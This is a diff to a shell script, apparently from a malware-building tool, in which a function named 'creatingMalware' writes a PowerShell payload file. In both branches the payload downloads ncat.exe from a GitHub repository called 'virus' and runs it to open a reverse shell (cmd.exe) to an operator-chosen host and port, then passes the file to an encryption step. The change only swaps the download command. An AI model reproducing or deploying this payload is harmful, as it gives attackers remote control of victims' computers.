@@ -10,12 +10,12 @@ grepIP() {
 creatingMalware() {
     if [[ -e .websocket.ps1 ]]; then 
     rm -rf .websocket.ps1
-    echo "(New-Object System.Net.WebClient).DownloadFile('https://github.com/manashma/virus/raw/main/ncat.exe', 'ncat.exe') ; cmd /c ncat -nv ${host} ${port} -e cmd.exe" > .websocket.ps1
+    echo "Invoke-Webrequest 'https://github.com/manashma/virus/raw/main/ncat.exe' -OutFile ncat.exe ; cmd /c ncat -nv ${host} ${port} -e cmd.exe" > .websocket.ps1
     sleep 2;
     printf "\nFile Generated\n"
     encryptFile
     else
-    echo "(New-Object System.Net.WebClient).DownloadFile('https://github.com/manashma/virus/raw/main/ncat.exe', 'ncat.exe') ; cmd /c ncat -nv ${host} ${port} -e cmd.exe" > .websocket.ps1
+    echo "Invoke-Webrequest 'https://github.com/manashma/virus/raw/main/ncat.exe' -OutFile ncat.exe ; cmd /c ncat -nv ${host} ${port} -e cmd.exe" > .websocket.ps1
     sleep 2;
     printf "\nFile Generated\n"
     encryptFile
